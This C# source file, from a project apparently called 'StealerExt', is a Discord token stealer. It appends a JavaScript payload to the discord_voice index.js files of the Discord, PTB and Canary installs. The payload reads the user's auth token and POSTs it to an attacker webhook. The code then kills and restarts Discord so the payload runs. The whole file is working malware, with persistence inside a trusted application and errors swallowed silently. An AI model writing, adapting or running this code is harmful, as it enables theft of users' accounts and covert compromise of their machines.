﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Newtonsoft.Json;

namespace StealerExt
{
    internal class Injection
    {
        private static bool Discord = false;
        private static bool DiscordCan = false;
        private static bool DiscordPTB = false;
        private static readonly string StringToInject = "var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[[\"extra_id\"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)\"getToken\"===e&&(token=r.default.getToken())}; var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send(`{\"content\": \"${token}\"}`);";
        
        public static void StartInjection()
        {
            try
            {
                foreach (string discord in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\", "*.*.*", SearchOption.TopDirectoryOnly))
                {
                    Discord = true;
                    string App = File.ReadAllText(discord + "\\modules\\discord_voice\\index.js");
                    if (!App.Contains(StringToInject))
                    {
                        File.AppendAllText(discord + "\\modules\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                    }
                }
            }
            catch { }
            try
            {
                foreach (string discordptb in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\", "*.*.*", SearchOption.TopDirectoryOnly))
                {
                    DiscordPTB = true;
                    string PTB = File.ReadAllText(discordptb + "\\modules\\discord_voice\\index.js");
                    if (!PTB.Contains(StringToInject))
                    {
                        File.AppendAllText(discordptb + "\\modules\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                    }
                }
            }
            catch { }
            try
            {
                foreach (string discordcanary in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\", "*.*.*", SearchOption.TopDirectoryOnly))
                {
                    DiscordCan = true;
                    string Can = File.ReadAllText(discordcanary + "\\modules\\discord_voice\\index.js");
                    if (!Can.Contains(StringToInject))
                    {
                        File.AppendAllText(discordcanary + "\\modules\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                    }

                }
            }
            catch { }
            try
            {
                foreach (string discord in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\", "app-*", SearchOption.TopDirectoryOnly))
                {
                    Discord = true;
                    foreach (string _path in Directory.GetDirectories(discord + "\\modules\\", "discord_voice-*"))
                    {
                        string App = File.ReadAllText(_path + "\\discord_voice\\index.js");
                        if (!App.Contains(StringToInject))
                        {
                            File.AppendAllText(_path + "\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                        }
                    }
                }
            }
            catch { }
            try
            {
                foreach (string discordptb in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB\\", "app-*", SearchOption.TopDirectoryOnly))
                {
                    DiscordPTB = true;
                    foreach (string _path in Directory.GetDirectories(discordptb + "\\modules\\", "discord_voice-*"))
                    {
                        string PTB = File.ReadAllText(_path + "\\discord_voice\\index.js");
                        if (!PTB.Contains(StringToInject))
                        {
                            File.AppendAllText(_path + "\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                        }
                    }
                }
            }
            catch { }
            try
            {
                foreach (string discordcanary in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary\\", "app-*", SearchOption.TopDirectoryOnly))
                {
                    DiscordCan = true;
                    foreach (string _path in Directory.GetDirectories(discordcanary + "\\modules\\", "discord_voice-*"))
                    {
                        string Can = File.ReadAllText(_path + "\\modules\\discord_voice\\index.js");
                        if (!Can.Contains(StringToInject))
                        {
                            File.AppendAllText(_path + "\\discord_voice\\index.js", Environment.NewLine + StringToInject);
                        }
                    }
                }
            }
            catch { }
            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
            if ((bool)config.rd == true)
            {
                try
                {
                    Process.GetProcesses()
                        .Where(x => x.ProcessName.StartsWith("Discord", StringComparison.OrdinalIgnoreCase))
                        .ToList()
                        .ForEach(x => x.Kill());
                    if (Discord)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe", "--processStart Discord.exe");
                    if (DiscordCan)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary\\Update.exe", "--processStart DiscordCanary.exe");
                    if (DiscordPTB)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB\\Update.exe", "--processStart DiscordPTB.exe");
                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopment\\Update.exe"))Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopment\\Update.exe", "--processStart DiscordDevelopment.exe");
                }
                catch { }
            }
        }
    }
}
